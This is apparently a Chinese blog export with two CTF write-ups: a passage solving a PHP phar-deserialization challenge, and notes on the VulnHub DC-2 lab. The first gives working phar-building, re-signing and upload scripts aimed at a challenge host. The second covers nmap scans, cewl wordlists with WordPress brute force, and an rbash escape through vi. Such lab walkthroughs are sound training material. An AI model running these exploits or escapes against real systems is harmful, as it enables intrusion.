            <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/get|flag|post|php|filter|base64|rot13|read|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"我知道你想干吗，我的建议是不要那样做。"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./tmp/a.txt"</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/get|flag|post|php|filter|base64|rot13|read|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"我知道你想干吗，我的建议是不要那样做。"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/get|flag|post|php|filter|base64|rot13|read|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"我知道你想干吗，我的建议是不要那样做。"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"那么就从这里开始起航吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>flag在环境变量里。</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"那么就从这里开始起航吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//注意到这里扔出异常，那就想到今天讲的GC机制了。</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在题目里也看到了</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./tmp/a.txt"</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
以及
<span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/get|flag|post|php|filter|base64|rot13|read|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span>
不免想到这里会使用phar协议
phar反序列化利用条件：
<span class="token operator">&lt;</span><span class="token number">1</span><span class="token operator">></span>有文件操作函数<span class="token punctuation">(</span>file_put_contents等等<span class="token punctuation">)</span>
<span class="token operator">&lt;</span><span class="token number">2</span><span class="token operator">></span>服务端有phar文件<span class="token punctuation">(</span>和后缀名无关，主要是格式。这里我们利用<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span>函数来写入文件<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>大概思路就是先写入文件到&#x2F;tmp&#x2F;a.txt中，再利用<strong>phar协议</strong>解析&#x2F;tmp&#x2F;a.txt文件，触发<code>destruct()</code>获取环境变量中的flag。绕过<code>throw new Error()</code>的方法就是自己触发GC机制，提前进入<code>__destruct()</code>。</p>
<h3 id="phar"><a href="#phar" class="headerlink" title="phar"></a>phar</h3><p>要生成phar文件的话，必须在php.ini文件中将phar.readonly选项设置为Off，否则无法生成phar文件。(设置时注意把前面分号删掉)<br> <img src="https://img-blog.csdnimg.cn/c2c224439fdc4c3ea5931ff326460616.png" alt="请添加图片描述"></p>
<p>生成phar文件代码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">getflag</span> <span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span>
 
<span class="token variable">$c</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"123.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//后缀名必须为phar</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"xxx"</span><span class="token operator">.</span><span class="token string double-quoted-string">"xxx&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置stub</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将自定义的meta-data存入manifest</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//添加要压缩的文件</span>
<span class="token comment">//签名自动计算</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>phar文件有四部分组成：</p>
<blockquote>
<ol>
<li>a stub</li>
</ol>
<p>stub的基本结构：**<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>，**前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p>
<p>​	2.a manifest describing the contents</p>
<p>Phar文件中被压缩的文件的一些信息，其中Meta-data部分的信息会以序列化的形式储存(可控)，当通过phar:&#x2F;&#x2F;协议对phar文件进行文件操作时，将会对phar文件中的Meta-data进行反序列化操作这里就是漏洞利用的关键点。</p>
<p>​	3. the file contents 文件内容</p>
<p>被压缩的文件内容，在没有特殊要求的情况下，这个被压缩的文件内容可以随便写的，因为我们利用这个漏洞主要是为了触发它的反序列化。</p>
<p>​	4.signature 签名</p>
<p>注意phar文件不能任意修改，修改之后由于签名的存在，文件就会失效。</p>
</blockquote>
<p>查看生成的phar文件：</p>
<p>phar的反序列化标签格式&#x3D;变长字节散列函数值+4字节所使用散列函数标签名+4字节固定标签GBMB</p>
<p><img src="https://img-blog.csdnimg.cn/21937b33f24b4b75951b683dd0bfadb9.png" alt="请添加图片描述"></p>
<p>根据02 00 00 00可知是sha1计算签名<a href="https://www.php.net/manual/zh/phar.fileformat.signature.php">文件链接</a><br> <img src="https://img-blog.csdnimg.cn/745c261c5195453fa2060be5ee60029e.png" alt="请添加图片描述"></p>
<p>好了，现在根据题目生成一个phar文件</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">getflag</span><span class="token punctuation">&#123;</span>

<span class="token punctuation">&#125;</span>

<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"czy.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                        <span class="token comment">//这里后缀必须为phar</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                             <span class="token comment">//开始写入内容</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER();?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment">//phar标识</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setmetadata</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">=></span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token operator">=></span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//上面数组中第一位是$a,第二位是null。序列化内容，这里内部相当于调用了serialize函数</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"czy.txt"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"czy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                           <span class="token comment">//添加要一起加入phar归档的文件（文件名+内容）</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                              <span class="token comment">//停止写入，签名自动计算</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"成功生成phar文件"</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在这里注意，我们把这个类先赋给数组，再令赋值数组为NULL，它就会失去引用从而触发GC，达到绕过GC的目的。</p>
<p>ok，程序运行后会生成一个czy.phar文件。我们看它的metadata部分</p>
<p><img src="https://img-blog.csdnimg.cn/2771c6ad047944e2b91e0608e09d73b9.png" alt="请添加图片描述"></p>
<p>注意这0是将对象实例化的内容，由于getflag里面为空，也就显示了<code>&#123;&#125;i</code>，而这里的1就是null，此时如果我们把1强行改为0，那么就验证了上面的说法<code>令赋值数组为null</code>从而触发GC机制。但是也要注意，再将<code>0:&#123;&#125;i:1;N;</code>改为<code>0:&#123;&#125;i:0;N;</code>后，该文件需要对签名进行修复，phar文件用16进制编辑器打开后后28位的后四位是固定标识GBMB，21-24位代表的是sha1签名标识，而1-20位在这里就需要修改了。</p>
<p>借鉴一下脚本：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> hashlib <span class="token keyword">import</span> sha1 <span class="token comment">#sha1签名</span>
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"czy.phar"</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
   text<span class="token operator">=</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   main<span class="token operator">=</span>text<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">28</span><span class="token punctuation">]</span>        <span class="token comment">#正文部分(除去最后28字节)</span>
   end<span class="token operator">=</span>text<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
   new_sign<span class="token operator">=</span>sha1<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span>
   new_phar<span class="token operator">=</span>main<span class="token operator">+</span>new_sign<span class="token operator">+</span>end
   <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"czy.phar"</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>new_phar<span class="token punctuation">)</span>     <span class="token comment">#将新生成的内容以二进制方式覆盖写入原来的phar文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里1-20位重新进行了sha1签名，修复好后，由于phar文件里还有getflag明文，如果要绕过正则的话，一个方法就是<strong>传数组</strong>来绕过正则，另一种办法就是将czy.phar再进行一次<strong>压缩</strong>，这样就不会出现getflag字样。</p>
<p>法一：</p>
<p>传数组</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> re

url<span class="token operator">=</span><span class="token string">"http://node4.anna.nssctf.cn:28513/"</span>

<span class="token comment">### 写入phar文件</span>
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"czy.phar"</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    data1<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'0[]'</span><span class="token punctuation">:</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>                                    <span class="token comment">#注意这里要传数组，来绕过waf</span>
    param1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">'O:1:"A":1:&#123;s:6:"config";s:1:"w";&#125;'</span><span class="token punctuation">&#125;</span>
    p1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>param1<span class="token punctuation">,</span>data<span class="token operator">=</span>data1<span class="token punctuation">)</span>
    <span class="token comment">#print(p1.text)</span>

<span class="token comment">### 读phar文件，触发反序列化</span>
param2<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token string">'O:1:"A":1:&#123;s:6:"config";s:1:"r";&#125;'</span><span class="token punctuation">&#125;</span>
data2<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token string">"phar://tmp/a.txt"</span><span class="token punctuation">&#125;</span>
p2<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>param2<span class="token punctuation">,</span>data<span class="token operator">=</span>data2<span class="token punctuation">)</span>
p2<span class="token punctuation">.</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span>
flag<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'NSSCTF\&#123;.*?\&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>findall<span class="token punctuation">(</span>p2<span class="token punctuation">.</span>text<span class="token punctuation">)</span>  <span class="token comment">#用正则匹配匹配post包的response.text里的‘NSSCTF&#123;xxxxxx&#125;’</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>法二：</p>
<p>压缩czy.phar文件</p>
<p><img src="https://img-blog.csdnimg.cn/a43894200dcf4af8a31e75a1a9ad2ccf.png" alt="请添加图片描述"></p>
<p>之后</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">'http://node4.anna.nssctf.cn:28513/'</span>
requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>
    url<span class="token punctuation">,</span>
    params<span class="token operator">=</span><span class="token punctuation">&#123;</span>
        <span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">'O:1:"A":1:&#123;s:6:"config";s:1:"w";&#125;'</span>

    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
        <span class="token number">0</span><span class="token punctuation">:</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'czy.phar.gz'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">)</span>

res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>
    url<span class="token punctuation">,</span>
    params<span class="token operator">=</span><span class="token punctuation">&#123;</span>
        <span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">'O:1:"A":1:&#123;s:6:"config";s:1:"r";&#125;'</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
        <span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">'phar://tmp/a.txt'</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">)</span>
res<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/95dfa9dfc043429a91753966aae7dffa.png" alt="2"></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://arsenetang.com/2021/11/28/%E6%B5%85%E6%9E%90GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E4%B8%8Ephar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#GC%E5%9C%A8phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E5%AE%9E%E9%99%85%E8%BF%90%E7%94%A8">参考链接1</a></p>
<p><a href="http://xilzy666.gitee.io/xilzy/2022/03/05/nss-prize1-2/">参考链接2</a></p>
<p><a href="https://blog.csdn.net/qq_51295677/article/details/123520193?ydreferer=aHR0cHM6Ly93d3cuYmluZy5jb20v">参考链接3</a></p>
<p><a href="https://www.php.net/manual/zh/features.gc.php">参考链接4</a></p>
<p><a href="https://blog.csdn.net/qq_53460654/article/details/121889104?ydreferer=aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzNDYwNjU0L2FydGljbGUvZGV0YWlscy8xMjE4ODkxMDQ=">参考链接5</a></p>
<p><a href="https://blog.csdn.net/weixin_53090346/article/details/127598455?ydreferer=aHR0cHM6Ly93d3cuYmluZy5jb20v">参考链接6</a></p>
]]></content>
      <categories>
        <category>知识点</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-2打靶笔记</title>
    <url>/2023/07/09/DC-2%E6%89%93%E9%9D%B6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="靶机安装以及配置"><a href="#靶机安装以及配置" class="headerlink" title="靶机安装以及配置"></a>靶机安装以及配置</h2><p>准备：</p>
<blockquote>
<p>kali虚拟机<br>dc-2靶机<br>windows11(可用可不用)</p>
</blockquote>
<p>靶场下载地址：<a href="https://download.vulnhub.com/dc/DC-2.zip">https://download.vulnhub.com/dc/DC-2.zip</a><br>下载好后用VM打开，设置为NAT模式<br><img src="https://img-blog.csdnimg.cn/3a2cf2a875e2404a8b5653dde6445ccc.png" alt="1"></p>
<p>开机</p>
<h2 id="打靶"><a href="#打靶" class="headerlink" title="打靶"></a>打靶</h2><p><strong>探测主机存活</strong><br>使用工具nmap：<code>nmap 192.168.206.136/24</code><br>检测到dc-2靶机地址为192.168.206.136<br><img src="https://img-blog.csdnimg.cn/4a9b341fd14d4e7587ad30fc6bbbf3fb.png" alt="2"><br><strong>深度探测靶机信息</strong></p>
<p><code>nmap -sV -p- 192.168.206.136</code></p>
<blockquote>
<p>-sV:端口扫描并获取服务版本信息<br>-p-:全端口扫描 </p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/9129aeec46a7400e91881908ff120fa4.png" alt="3"><br>登陆网站192.168.206.136<br>登陆网站时会发生一些问题显示<code>Did not follow redirect to http://dc-2/</code>，意思就是没有重定向到<a href="http://dc-2/%EF%BC%8C%E7%94%B1%E4%BA%8E%E6%88%91%E6%89%93%E9%9D%B6%E7%9A%84%E6%97%B6%E5%80%99%E4%BD%BF%E7%94%A8%E6%9C%AC%E6%9C%BA%E8%BF%9B%E8%A1%8C%E7%9A%84%EF%BC%8C%E5%90%8C%E6%97%B6%E4%BC%9A%E4%BD%BF%E7%94%A8kali%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7%EF%BC%8C%E9%82%A3%E4%B9%88%E9%9C%80%E8%A6%81%E5%B0%86kali%E7%9A%84hosts%E6%96%87%E4%BB%B6%EF%BC%88/etc/hosts%EF%BC%89%E6%B7%BB%E5%8A%A0%E4%B8%80%E4%B8%8B%E6%9C%AC%E5%9C%B0DNS%E8%A7%A3%E6%9E%90%E3%80%82">http://dc-2/，由于我打靶的时候使用本机进行的，同时会使用kali上的一些工具，那么需要将kali的hosts文件（/etc/hosts）添加一下本地DNS解析。</a></p>
<p><img src="https://img-blog.csdnimg.cn/af1bd1db85754fda8912593927733dcf.png" alt="3"><br><strong>windows</strong>host文件在<code>&quot;C:\Windows\System32\drivers\etc\hosts&quot;</code>，添加完之后即可正常进行。<br>打开网站后查看网站整体框架，可以使用kali中的工具<code>whatweb</code>，或者浏览器插件<br><img src="https://img-blog.csdnimg.cn/03fd35a8fd4948e890abcd0db30f9bf3.png" alt="2"><br>可以知道网站是wordpress<br>拿到flag1<br><img src="https://img-blog.csdnimg.cn/0fc407bd818c4d52a034bf10a1cefb37.png" alt="6"></p>
<blockquote>
<p>标志 1：<br>你常用的单词表可能不起作用，所以，也许你只需要 cewl 即可。<br>密码越多越好，但有时您无法赢得所有密码。<br>以一个身份登录即可查看下一个标志。<br>如果找不到，请以其他身份登录。</p>
</blockquote>
<p>查看一下cewl是什么</p>
<blockquote>
<p>cewl 是一个用于生成自定义字典（custom wordlist）的工具，它是根据目标网站或文本中提取的单词和短语创建字典的一种方式。<br>cewl 的全称是 “Custom Word List generator”，它是一个基于Ruby编写的命令行工具。它的主要功能是分析指定的文本或通过爬取目标网站提取出的单词，并根据提取的内容生成一个定制的字典。<br>这个工具在渗透测试和安全评估中经常用于密码破解、暴力攻击和社交工程等方面。通过生成针对特定目标的字典，攻击者可以尝试使用常见的、有可能与目标相关的单词和短语进行密码破解或攻击。<br>cewl 可以根据不同的选项和参数来调整字典的生成过程，例如排除特定的单词、设置最小和最大长度限制、指定输出文件等。</p>
</blockquote>
<p>那意思已经很清楚了，就让我们登录进去，先用cewl制作密码字典<br><code>cewl url -w 文件名</code>即可生成一个字典，后面你可以使用wpscan进行用户名猜解和密码爆破，后续就不演示了，最后可知存在用户<strong>admin，jerry，tom</strong>密码就使用cewl跑出来的密码。最后可以找出jerry和tom的密码，后面登陆jerry用户后可以得到flag2<br><img src="https://img-blog.csdnimg.cn/3381eac70aea4ae0841ad1cec1a30318.png" alt="2"></p>
<blockquote>
<p>如果你无法利用 WordPress 并走捷径，还有另一种方法。<br>希望您找到另一个切入点。</p>
</blockquote>
<p>在这里想到刚才探测端口的时候存在ssh，但是端口改到了7744，使用ssh登陆一下。<br>直接写知识点吧，肝一天了。。。</p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h3><p>这个时候使用nmap进行探测</p>
<blockquote>
<p>nmap -A -p- 192.168.206.136 全端口探测，还有端口服务以及详细配置</p>
</blockquote>
<h3 id="本地DNS设置"><a href="#本地DNS设置" class="headerlink" title="本地DNS设置"></a>本地DNS设置</h3><p><strong>hosts文件地址</strong><br>windows：”C:\Windows\System32\drivers\etc\hosts”<br>linux：&#x2F;etc&#x2F;hosts</p>
<h3 id="cewl工具的使用"><a href="#cewl工具的使用" class="headerlink" title="cewl工具的使用"></a>cewl工具的使用</h3><p>cewl 是一个用于生成自定义字典（custom wordlist）的工具，它是根据目标网站或文本中提取的单词和短语创建字典的一种方式。</p>
<p>cewl 的全称是 “Custom Word List generator”，它是一个基于Ruby编写的命令行工具。它的主要功能是分析指定的文本或通过爬取目标网站提取出的单词，并根据提取的内容生成一个定制的字典。</p>
<p>这个工具在渗透测试和安全评估中经常用于密码破解、暴力攻击和社交工程等方面。通过生成针对特定目标的字典，攻击者可以尝试使用常见的、有可能与目标相关的单词和短语进行密码破解或攻击。</p>
<p>cewl 可以根据不同的选项和参数来调整字典的生成过程，例如排除特定的单词、设置最小和最大长度限制、指定输出文件等。<br>基础命令：<code>cewl url -w 文件名</code>这样之后会生成一个有关该网站的字典，便于后面爆破密码使用。<br><a href="https://www.freebuf.com/articles/network/190128.html">Kali Linux字典生成工具Cewl使用全指南</a></p>
<h3 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h3><p>这个tom用户可以登录，jerry登陆不了，密码就是爆破出来的。</p>
<h3 id="rbash逃逸-提权的一种"><a href="#rbash逃逸-提权的一种" class="headerlink" title="rbash逃逸(提权的一种)"></a>rbash逃逸(提权的一种)</h3><p>rbash：就是受限的bash（bash，一个命令行解释器，接受用户输入的指令并且执行相应的命令），一些命令不能使用<br>以下情况是不允许rbash执行的</p>
<blockquote>
<p>使用命令cd更改目录<br>设置或者取消环境变量的设置（SHELL, PATH, ENV, or BASH_ENV）<br>指定包含参数’&#x2F;‘的文件名<br>指定包含参数’ - ‘的文件名<br>使用重定向输出’&gt;’, ‘&gt;&gt;’, ‘&gt; |’, ‘&lt;&gt;’ ‘&gt;&amp;’,’&amp;&gt;’</p>
</blockquote>
<p>大致的限制如上<br>因此本靶场用到rbash逃逸，由于测试后发现vi命令可以使用，因此使用vi设置shell。<br>进入vi界面</p>
<blockquote>
<p>vi</p>
<p>然后按Esc键，输入<br>:set shell&#x3D;&#x2F;bin&#x2F;bash</p>
</blockquote>
<p>设置好shell并回车，接着输入 </p>
<blockquote>
<p>:shell</p>
